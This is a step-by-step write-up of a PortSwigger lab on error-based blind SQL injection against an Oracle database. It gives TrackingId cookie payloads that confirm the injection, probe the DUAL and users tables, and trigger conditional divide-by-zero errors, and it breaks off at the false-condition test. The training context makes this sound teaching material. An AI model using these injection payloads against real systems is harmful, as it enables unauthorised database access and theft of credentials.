Lab Description:

![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/37527be6-80ad-4666-a684-48c33534c655)

Solutions:

Request looks like this

![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/5dcb68ed-962f-4def-904a-27f9f05d73f0)

Query looks like the following

```SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'```

1. Inducing error message -
Add an extra ' symbol. We see that error appears because of incorrect ssql syntax

SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''

![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/2d545cc2-7f76-46f2-bedf-f62420fb5742)

Add 2 extra ' symbol, we get a response back which indicates that the sql syntax is correct ('' indicates opening and closing of query & hence correct sql query)

```SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'''```

![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/a9b7b8b8-02da-4003-b850-64a7bc87a4d5)


2. Conform the reason for error is invalid SQL query -
To do this, you first need to construct a subquery using valid SQL syntax. Try submitting: TrackingId=xyz'||(SELECT '')||'

![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/ab608f5d-e6ce-4e39-880e-815c114a0fda)

In this case, notice that the query still appears to be invalid. This may be because the database used here is ORACLE & for that we need to specify a table called DUAL. Hence we got this error.

Try specifying a predictable table name in the query: TrackingId=xyz'||(SELECT '' FROM dual)||'

We get a response without any error , we can confrom that it is an ORACLE database which requires all SELECT statements to explicitly specify a table name.

To conform this we can give an invalid query by specifying some random table TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'


![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/cc43a955-1177-4575-85fc-a85553f4f895)

Verify users table exist -
We can verify whether users table exist or not by the following command TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'

![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/82fecc78-42e1-46ae-941a-ac6140dcf542)

No error -> implies that users table exist.

NOTE - Note that the WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row, which would break > our concatenation.

Checking whether administrator user is present in db -
We can exploit this error inducing queries to test if admin user is present or not

1.Set (1=1) ie. Condition is TRUE - TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/ef758f56-784b-4ece-8749-b7c6adff0e0e)

We receive an error. means the condition is TRUE so it threw an divide by 0 error

Set (1=2) ie. Condition is FALSE - TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/21df0662-c1e1-4689-b2e4-cd29f63d776b)
